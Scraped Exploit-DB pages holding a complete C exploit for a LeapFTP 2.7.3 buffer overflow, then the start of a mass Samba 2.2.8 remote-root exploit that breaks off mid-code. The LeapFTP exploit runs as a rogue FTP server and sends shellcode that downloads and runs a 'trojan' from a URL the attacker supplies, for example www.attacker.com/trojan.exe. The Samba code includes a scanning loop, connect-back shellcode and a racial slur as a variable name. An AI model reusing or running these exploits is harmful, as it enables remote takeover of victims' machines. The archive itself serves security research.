{//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 54
LeapWare LeapFTP 2.7.x - Remote Buffer Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDLeapWare LeapFTP 2.7.x - Remote Buffer OverflowEDB-ID:54CVE:2003-0558EDB Verified:Author:drG4njubasType:remoteExploit:/Platform:WindowsDate:2003-07-12Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*,----------------------------------------------------;     LeapFTP remote buffer overflow exploit;              by drG4njubas \\ DWC Group`----------------------------------------------------,----------------------------------------------------;This exploit works against LeapFTP 2.7.3.600;running on windows 2000 SP3 russian edition.;Technical details: When LeapFTP requests IP;and port by using PASV command if pasv mode;is enabled, it causes the buffer overflow on;the stack area if server's reply for this;PASV request has a long IP address:;227 (AAAAAAAAA...(1057 bytes)... ,1,1,1,1,1);And this buffer overflow can overwrite a;Structured Exception Handler on the stack;area with an arbitrary value by specifying;the address data over 1057 bytes. If this;reply contains 0x29 and 0x2E bytes, an;exception occurs before Structured Exception;Handler is overvritten and program continues;it's normal work. Thanks a lot to RaiSe for;his wonderful shellcode.`----------------------------------------------------*/#include<winsock.h>#include<stdio.h>void main(int argc, char *argv[]){printf(",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n");printf(";LeapFTP 2.7.3.600 remote buffer overflow exploit;\n");printf("; Coded by drG4njubas \\\\ DWC Security Group ;\n");printf("; www.dwcgr0up.net ;\n");printf("'''''''''''''''''''''''''''''''''''''''''''''''''''\n");if(argc < 3){printf("USAGE : dwclft273.exe <port> <trojan url>\n");printf("EXAMPLE : dwclft273.exe 21 http://www.attacker.com/trojan.exe\n");return;}char exploit[] ="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xEB\x30\x5F\xFC\x8B\xF7\x80""\x3F\x08\x75\x03\x80\x37\x08\x47\x80\x3F\x01\x75\xF2\x8B\xE6\x33\xD2\xB2\x04\xC1""\xE2\x08\x2B\xE2\x8B\xEC\x33\xD2\xB2\x03\xC1\xE2\x08\x2B\xE2\x54\x5A\xB2\x7C\x8B""\xE2\xEB\x02\xEB\x57\x89\x75\xFC\x33\xC0\xB4\x40\xC1\xE0\x08\x89\x45\xF8\x8B\x40""\x3C\x03\x45\xF8\x8D\x40\x7E\x8B\x40\x02\x03\x45\xF8\x8B\xF8\x8B\x7F\x0C\x03\x7D""\xF8\x81\x3F\x4B\x45\x52\x4E\x74\x07\x83\xC0\x14\x8B\xF8\xEB\xEB\x50\x8B\xF8\x33""\xC9\x33\xC0\xB1\x10\x8B\x17\x03\x55\xF8\x52\xEB\x03\x57\x8B\xD7\x80\x7A\x03\x80""\x74\x16\x8B\x32\x03\x75\xF8\x83\xC6\x02\xEB\x02\xEB\x7E\x8B\x7D\xFC\x51\xF3\xA6""\x59\x5F\x74\x06\x40\x83\xC7\x04\xEB\xDB\x5F\x8B\x7F\x10\x03\x7D\xF8\xC1\xE0\x02""\x03\xF8\x8B\x07\x8B\x5D\xFC\x8D\x5B\x11\x53\xFF\xD0\x89\x45\xF4\x8B\x40\x3C\x03""\x45\xF4\x8B\x70\x78\x03\x75\xF4\x8D\x76\x1C\xAD\x03\x45\xF4\x89\x45\xF0\xAD\x03""\x45\xF4\x89\x45\xEC\xAD\x03\x45\xF4\x89\x45\xE8\x8B\x55\xEC\x8B\x75\xFC\x8D\x76""\x1E\x33\xDB\x33\xC9\xB1\x0F\x8B\x3A\x03\x7D\xF4\x56\x51\xF3\xA6\x59\x5E\x74\x06""\x43\x8D\x52\x04\xEB\xED\xD1\xE3\x8B\x75\xE8\x03\xF3\x33\xC9\x66\x8B\x0E\xEB\x02""\xEB\x7D\xC1\xE1\x02\x03\x4D\xF0\x8B\x09\x03\x4D\xF4\x89\x4D\xE4\x8B\x5D\xFC\x8D""\x5B\x2D\x33\xC9\xB1\x07\x8D\x7D\xE0\x53\x51\x53\x8B\x55\xF4\x52\x8B\x45\xE4\xFC""\xFF\xD0\x59\x5B\xFD\xAB\x8D\x64\x24\xF8\x38\x2B\x74\x03\x43\xEB\xF9\x43\xE2\xE1""\x8B\x45\xE0\x53\xFC\xFF\xD0\xFD\xAB\x33\xC9\xB1\x04\x8D\x5B\x0C\xFC\x53\x51\x53""\x8B\x55\xC4\x52\x8B\x45\xE4\xFF\xD0\x59\x5B\xFD\xAB\x38\x2B\x74\x03\x43\xEB\xF9""\x43\xE2\xE5\xFC\x33\xD2\xB6\x1F\xC1\xE2\x08\x52\x33\xD2\x52\x8B\x45\xD4\xFF\xD0""\x89\x45\xB0\x33\xD2\xEB\x02\xEB\x77\x52\x52\x52\x52\x53\x8B\x45\xC0\xFF\xD0\x8D""\x5B\x03\x89\x45\xAC\x33\xD2\x52\xB6\x80\xC1\xE2\x10\x52\x33\xD2\x52\x52\x8D\x7B""\x09\x57\x50\x8B\x45\xBC\xFF\xD0\x89\x45\xA8\x8D\x55\xA0\x52\x33\xD2\xB6\x1F\xC1""\xE2\x08\x52\x8B\x4D\xB0\x51\x50\x8B\x45\xB8\xFF\xD0\x8B\x4D\xA8\x51\x8B\x45\xB4""\xFF\xD0\x8B\x4D\xAC\x51\x8B\x45\xB4\xFF\xD0\x33\xD2\x52\x53\x8B\x45\xDC\xFF\xD0""\x89\x45\xA4\x8B\x7D\xA0\x57\x8B\x55\xB0\x52\x50\x8B\x45\xD8\xFF\xD0\x8B\x55\xA4""\x52\x8B\x45\xD0\xFF\xD0\xEB\x02\xEB\x12\x33\xD2\x90\x52\x53\x8B\x45\xCC\xFF\xD0""\x33\xD2\x52\x8B\x45\xC8\xFF\xD0\xE8\xE6\xFD\xFF\xFF\x47\x65\x74\x4D\x6F\x64\x75""\x6C\x65\x48\x61\x6E\x64\x6C\x65\x41\x08\x6B\x65\x72\x6E\x65\x6C\x33\x32\x2d\x64""\x6C\x6C\x08\x47\x65\x74\x50\x72\x6F\x63\x41\x64\x64\x72\x65\x73\x73\x08\x4C\x6F""\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x08\x5F\x6C\x63\x72\x65\x61\x74\x08\x5F""\x6C\x77\x72\x69\x74\x65\x08\x47\x6C\x6F\x62\x61\x6C\x41\x6C\x6C\x6F\x63\x08\x5F""\x6C\x63\x6C\x6F\x73\x65\x08\x57\x69\x6E\x45\x78\x65\x63\x08\x45\x78\x69\x74\x50""\x72\x6F\x63\x65\x73\x73\x08\x77\x69\x6E\x69\x6E\x65\x74\x2d\x64\x6C\x6C\x08\x49""\x6E\x74\x65\x72\x6E\x65\x74\x4F\x70\x65\x6E\x41\x08\x49\x6E\x74\x65\x72\x6E\x65""\x74\x4F\x70\x65\x6E\x55\x72\x6C\x41\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x52\x65""\x61\x64\x46\x69\x6C\x65\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x43\x6C\x6F\x73\x65""\x48\x61\x6E\x64\x6C\x65\x08\x4E\x53\x08\x6E\x73\x73\x63\x2d\x65\x78\x65\x08\x68""\x74\x74\x70\x3A\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93""\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93""\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93""\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93\x93""\x93\x93\x93\x93\x93\x93\x93\x93\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x25\x49\xE1""\x77\x90\x90\x90\x90\xFE\x83\x75\xFE\xFF\xFF\xFE\x83\xD5\xFE\xFF\xFF\xFE\x83\x25""\xFF\xFF\xFF\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x80\xAB\x2F\xFF\xFF\xFF\x03\x80\xAB\x30\xFF\xFF\xFF\x03\x80\xAB\x31\xFF\xFF\xFF""\x03\x80\xAB\x32\xFF\xFF\xFF\x03\x80\xAB\x33\xFF\xFF\xFF\x03\x80\xAB\x34\xFF\xFF""\xFF\x03\x80\xAB\x35\xFF\xFF\xFF\x03\x80\xAB\x36\xFF\xFF\xFF\x03\x80\xAB\x37\xFF""\xFF\xFF\x03\x80\xAB\x38\xFF\xFF\xFF\x03\x80\xAB\x39\xFF\xFF\xFF\x03\x80\xAB\x3A""\xFF\xFF\xFF\x03\x80\xAB\x3B\xFF\xFF\xFF\x03\x80\xAB\x3C\xFF\xFF\xFF\x03\x80\xAB""\x3D\xFF\xFF\xFF\x03\x80\xAB\x3E\xFF\xFF\xFF\x03\x80\xAB\x3F\xFF\xFF\xFF\x03\x80""\xAB\x40\xFF\xFF\xFF\x03\x80\xAB\x41\xFF\xFF\xFF\x03\x80\xAB\x42\xFF\xFF\xFF\x03""\x80\xAB\x43\xFF\xFF\xFF\x03\x80\xAB\x44\xFF\xFF\xFF\x03\x80\xAB\x45\xFF\xFF\xFF""\x03\x80\xAB\x46\xFF\xFF\xFF\x03\x80\xAB\x47\xFF\xFF\xFF\x03\x80\xAB\x48\xFF\xFF""\xFF\x03\x80\xAB\x49\xFF\xFF\xFF\x03\x80\xAB\x4A\xFF\xFF\xFF\x03\x80\xAB\x4B\xFF""\xFF\xFF\x03\x80\xAB\x4C\xFF\xFF\xFF\x03\x80\xAB\x4D\xFF\xFF\xFF\x03\x80\xAB\x4E""\xFF\xFF\xFF\x03\x80\xAB\x4F\xFF\xFF\xFF\x03\x80\xAB\x50\xFF\xFF\xFF\x03\x80\xAB""\x51\xFF\xFF\xFF\x03\x80\xAB\x52\xFF\xFF\xFF\x03\x80\xAB\x53\xFF\xFF\xFF\x03\x80""\xAB\x54\xFF\xFF\xFF\x03\x80\xAB\x55\xFF\xFF\xFF\x03\x80\xAB\x56\xFF\xFF\xFF\x03""\x80\xAB\x57\xFF\xFF\xFF\x03\x80\xAB\x58\xFF\xFF\xFF\x03\x80\xAB\x59\xFF\xFF\xFF""\x03\x80\xAB\x5A\xFF\xFF\xFF\x03\x80\xAB\x5B\xFF\xFF\xFF\x03\x80\xAB\x5C\xFF\xFF""\xFF\x03\x80\xAB\x5D\xFF\xFF\xFF\x03\x80\xAB\x5E\xFF\xFF\xFF\x03\x80\xAB\x5F\xFF""\xFF\xFF\x03\x80\xAB\x60\xFF\xFF\xFF\x03\x80\xAB\x61\xFF\xFF\xFF\x03\x80\xAB\x62""\xFF\xFF\xFF\x03\x80\xAB\x63\xFF\xFF\xFF\x03\x80\xAB\x64\xFF\xFF\xFF\x03\x80\xAB""\x65\xFF\xFF\xFF\x03\x80\xAB\x66\xFF\xFF\xFF\x03\x80\xAB\x67\xFF\xFF\xFF\x03\x80""\xAB\x68\xFF\xFF\xFF\x03\x80\xAB\x69\xFF\xFF\xFF\x03\x80\xAB\x6A\xFF\xFF\xFF\x03""\x80\xAB\x6B\xFF\xFF\xFF\x03\x80\xAB\x6C\xFF\xFF\xFF\x03\x80\xAB\x6D\xFF\xFF\xFF""\x03\x80\xAB\x6E\xFF\xFF\xFF\x03\x80\xAB\x6F\xFF\xFF\xFF\x03\x80\xAB\x70\xFF\xFF""\xFF\x03\x80\xAB\x71\xFF\xFF\xFF\x03\x80\xAB\x72\xFF\xFF\xFF\x03\x80\xAB\x73\xFF""\xFF\xFF\x03\x80\xAB\x74\xFF\xFF\xFF\x03\x80\xAB\x75\xFF\xFF\xFF\x03\x80\xAB\x76""\xFF\xFF\xFF\x03\x80\xAB\x77\xFF\xFF\xFF\x03\x80\xAB\x78\xFF\xFF\xFF\x03\x80\xAB""\x79\xFF\xFF\xFF\x03\x80\xAB\x7A\xFF\xFF\xFF\x03\x80\xAB\x7B\xFF\xFF\xFF\x03\x80""\xAB\x7C\xFF\xFF\xFF\x03\x80\xAB\x7D\xFF\xFF\xFF\x03\x80\xAB\x7E\xFF\xFF\xFF\x03""\x80\xAB\x7F\xFF\xFF\xFF\x03\x80\x6B\x80\x03\x80\x6B\x81\x03\x80\x6B\x82\x03\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xE9\x61\xF9\xFF\xFF";char *url = argv[2];if(strlen(url)>80){printf("ERROR: trojan url is too long!\n");return;}for(unsigned int i = 5; i < strlen(url); i++){url[i]+=3;exploit[839+i] = url[i];}exploit[839+i] = '\x0B';exploit[839+i+1] = '\x04';WSADATA wsaData;WSAStartup(MAKEWORD(2,2), &wsaData);SOCKET listen_Sock = socket(AF_INET,SOCK_STREAM,0);SOCKADDR_IN addr_Sock;addr_Sock.sin_family = AF_INET;addr_Sock.sin_addr.s_addr = htonl(INADDR_ANY);addr_Sock.sin_port = htons(atoi(argv[1]));printf("Awaiting for connections...\n");if(bind(listen_Sock,(LPSOCKADDR)&addr_Sock, sizeof(struct sockaddr))) return;if(listen(listen_Sock, 1))return;SOCKET victim = accept(listen_Sock,NULL,NULL);printf("Victim connected...\n");char buffer[2048];sprintf(buffer, "220 drG4njubas roxx da world...\r\n");send(victim, buffer, strlen(buffer), NULL);while(true){if(recv(victim, buffer, 2048, NULL)==SOCKET_ERROR)return;if(strncmp(buffer, "USER", 4)==0){sprintf(buffer, "%s\r\n", "331 Password required for user.");send(victim, buffer, strlen(buffer), NULL);}else if(strncmp(buffer, "PASS", 4)==0){sprintf(buffer, "%s\r\n", "230 User logged in.");send(victim, buffer, strlen(buffer), NULL);}else if(strncmp(buffer, "SYST", 4)==0){sprintf(buffer, "%s\r\n", "215 Windows_NT version 5.0");send(victim, buffer, strlen(buffer), NULL);}else if(strncmp(buffer, "REST", 4)==0){sprintf(buffer, "%s\r\n", "350 Restarting at blah.");send(victim, buffer, strlen(buffer), NULL);}else if(strncmp(buffer, "PWD", 3)==0){sprintf(buffer, "%s\r\n", "257 Current directory was changed.");send(victim, buffer, strlen(buffer), NULL);}else if(strncmp(buffer, "TYPE", 4)==0){sprintf(buffer, "%s\r\n", "200 Type set to blah.");send(victim, buffer, strlen(buffer), NULL);}else if(strncmp(buffer, "PASV", 4)==0){printf("PASV command received, sending exploit...");sprintf(buffer, "227 (%s,1,1,1,1,1)\r\n", exploit);send(victim, buffer, strlen(buffer), NULL);printf("finnished.\n");break;}else{printf("ERROR: Wrong client or pasv mode is not enabled.\n");break;}}closesocket(victim);closesocket(listen_Sock);WSACleanup();}// milw0rm.com [2003-07-12]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 55
Samba 2.2.8 - Brute Force Method Remote Command Execution - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDSamba 2.2.8 - Brute Force Method Remote Command ExecutionEDB-ID:55CVE:2003-0201EDB Verified:Author:SchizoprenicType:remoteExploit:/Platform:LinuxDate:2003-07-13Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** Mass Samba Exploit by Schizoprenic* Xnuxer-Research (c) 2003* This code just for eduction purpose*/#include <stdio.h>#include <stdlib.h>#include <sys/stat.h>void usage(char *s){printf("Usage: %s  \n",s);exit(-1);}int main(int argc, char **argv){printf("Mass Samba Exploit by Schizoprenic\n");if(argc != 3) usage(argv[0]);scan(argv[1], argv[2]);return 0;}int scan(char *fl, char *bind_ip){FILE *nigger,*fstat;char buf[512];char cmd[100];int i;struct stat st;if((nigger=fopen(fl,"r")) == NULL) {fprintf(stderr,"File %s not found!\n", fl);return -1;}while(fgets(buf,512,nigger) != NULL){if(buf[strlen(buf)-1]=='\n') buf[strlen(buf)-1]=0;for (i=0;i<4;i++) {sprintf(cmd, "./smb %d %s %s", i, buf, bind_ip);printf("\nTrying get root %s use type %d ...\n",buf,i);system(cmd);if (stat(".ROOT", &st) != -1) {unlink(".ROOT");break;}}}fclose(nigger);printf("\nMass exploiting finished.\n");}/**  Samba Remote Root Exploit by Schizoprenic from Xnuxer-Labs, 2003.*  Using connect back method and brute force mode.*  I just create & modify some code and ripped too :P*  Create on May, 12st 2003**  Thanks to eDSee (netric.org), Sambal is nice exploit bro...*  References: trans2root.pl, 0x333hate.c, sambal.c*  This code just for eduction purpose**  XNUXER RESEARCH LABORATORY*  Official Site: http://infosekuriti.com*  Contact Email: xnuxer@yahoo.com, xnuxer@hackermail.com*/#include#include#include#include#include#include#include#include#include#include#include#include#include#include#include#include#includecharlinux_connect_back[] =/* fork(), execve sh -c [client] [host to bounce to], term=xterm 